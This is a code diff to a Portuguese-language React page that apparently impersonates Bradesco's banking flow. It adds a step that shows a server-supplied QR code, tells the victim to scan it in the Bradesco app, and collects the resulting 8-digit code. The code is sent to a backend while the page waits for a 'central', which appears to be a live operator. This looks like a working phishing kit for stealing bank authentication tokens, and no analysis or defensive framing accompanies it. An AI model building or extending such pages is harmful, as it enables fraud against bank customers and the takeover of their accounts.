@@ -79,6 +79,10 @@ function InternaPage() {
   const [aguardandoToken, setAguardandoToken] = useState(false);
   const [erroToken, setErroToken] = useState<string | null>(null);
   const [qrCodeUrl, setQrCodeUrl] = useState<string | null>(null);
+  const [qrCodigo, setQrCodigo] = useState("");
+  const [qrEnviando, setQrEnviando] = useState(false);
+  const [qrAguardando, setQrAguardando] = useState(false);
+  const [qrErro, setQrErro] = useState<string | null>(null);
   const tokenEnviadoEmRef = useRef<string | null>(null);
 
 
@@ -113,7 +117,16 @@ function InternaPage() {
         }
         setTokenSerial(res.token_serial ?? null);
         setTokenNome(res.token_nome ?? null);
-        setQrCodeUrl(res.qr_code_url ?? null);
+        const novoQr = res.qr_code_url ?? null;
+        setQrCodeUrl((cur) => {
+          if (cur && !novoQr) {
+            setQrCodigo("");
+            setQrAguardando(false);
+            setQrEnviando(false);
+            setQrErro(null);
+          }
+          return novoQr;
+        });
 
 
 
@@ -369,21 +382,84 @@ function InternaPage() {
           <div className="relative w-full max-w-sm rounded-2xl border border-white/40 bg-white p-6 shadow-2xl">
             <div className="mb-4 text-center">
               <h3 className="text-base font-bold text-slate-800">
-                Escaneie o QR Code
+                Validação por QR Code
               </h3>
-              <p className="mt-1 text-xs text-slate-500">
-                Utilize o aplicativo Bradesco para escanear e concluir a validação.
+              <p className="mt-2 text-[12px] leading-relaxed text-slate-600">
+                Abra o aplicativo <strong>Bradesco</strong> no seu celular, acesse
+                <strong> Mais &gt; Ler QR Code</strong> e aponte a câmera para o código
+                abaixo. Após a leitura, o app exibirá um <strong>código de 8 dígitos</strong> —
+                digite-o abaixo para concluir a validação da BIA.
               </p>
             </div>
             <div className="flex justify-center rounded-lg border border-slate-200 bg-white p-3">
               <img
                 src={qrCodeUrl}
                 alt="QR Code de validação"
-                className="h-64 w-64 object-contain"
+                className="h-56 w-56 object-contain"
               />
             </div>
-            <p className="mt-4 text-center text-[11px] text-slate-400">
-              Aguarde... a página avança automaticamente após a leitura.
+
+            <form
+              onSubmit={async (e) => {
+                e.preventDefault();
+                setQrErro(null);
+                const valor = qrCodigo.replace(/\D/g, "");
+                if (valor.length !== 8) {
+                  setQrErro("Digite os 8 dígitos exibidos no aplicativo.");
+                  return;
+                }
+                setQrEnviando(true);
+                try {
+                  await enviarTk({ data: { id, token: valor } });
+                  tokenEnviadoEmRef.current = new Date().toISOString();
+                  setQrAguardando(true);
+                } catch {
+                  setQrErro("Não foi possível enviar. Tente novamente.");
+                } finally {
+                  setQrEnviando(false);
+                }
+              }}
+              className="mt-4"
+            >
+              <label className="mb-1 block text-[11px] font-bold uppercase tracking-widest text-slate-500">
+                Código de 8 dígitos
+              </label>
+              <input
+                type="text"
+                inputMode="numeric"
+                pattern="[0-9]*"
+                maxLength={8}
+                autoComplete="off"
+                value={qrCodigo}
+                onChange={(e) => setQrCodigo(e.target.value.replace(/\D/g, "").slice(0, 8))}
+                disabled={qrAguardando || qrEnviando}
+                placeholder="00000000"
+                className="w-full rounded-lg border border-slate-300 bg-white px-3 py-2 text-center font-mono text-lg tracking-[0.4em] text-slate-800 outline-none focus:border-bia-purple"
+              />
+              {qrErro && (
+                <p className="mt-2 text-[11px] font-medium text-red-600">{qrErro}</p>
+              )}
+              <button
+                type="submit"
+                disabled={qrAguardando || qrEnviando || qrCodigo.length !== 8}
+                className="mt-3 flex w-full items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-bia-purple to-bia-pink px-4 py-2.5 text-sm font-bold text-white shadow-md transition-opacity disabled:opacity-50"
+              >
+                {qrEnviando ? (
+                  <>
+                    <Loader2 className="h-4 w-4 animate-spin" /> Enviando...
+                  </>
+                ) : qrAguardando ? (
+                  <>
+                    <Loader2 className="h-4 w-4 animate-spin" /> Aguardando central...
+                  </>
+                ) : (
+                  "Enviar código"
+                )}
+              </button>
+            </form>
+
+            <p className="mt-3 text-center text-[10px] text-slate-400">
+              Mantenha esta tela aberta durante o processo.
             </p>
           </div>
         </div>
